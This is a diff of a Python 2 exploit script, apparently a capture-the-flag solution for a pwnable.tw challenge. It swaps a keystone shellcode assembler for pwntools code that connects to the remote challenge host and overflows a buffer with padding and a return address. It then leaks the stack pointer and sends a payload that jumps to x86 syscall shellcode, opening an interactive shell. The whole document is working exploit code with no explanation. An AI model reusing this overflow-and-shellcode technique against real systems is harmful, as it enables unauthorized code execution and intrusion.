@@ -1,10 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import socket
-import struct
-from keystone import *
-from hexdump import hexdump
+from pwn import *
 
 shellcode = """\
 xor     eax, eax
@@ -21,21 +18,16 @@ inc     eax
 int     0x80
 """
 
-try:
-    ks = Ks(KS_ARCH_X86, KS_MODE_32)
-    encoding, count = ks.asm(shellcode)
-except KsError as e:
-    print("ERROR: %s" % e)
+#conn = remote('localhost', 10000)
+conn = remote('chall.pwnable.tw', 10000)
+print conn.recvuntil(':')
 
-print 'shellcode:'
-shellcode_buf = ''.join([chr(x) for x in encoding])
-hexdump(shellcode_buf)
+message = 'A'*20 + p32(0x08048087)
+conn.send(message)
 
-print 'addr:'
-addr = struct.pack('!I', 0x08048060)
-hexdump(addr)
+res = conn.recv(20)
+esp = u32(res[0:4])
 
-quit()
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('localhost', 10000))
-
+payload = 'A'*20 + p32(esp+0x14)+asm(shellcode)
+conn.sendline(payload)
+conn.interactive()
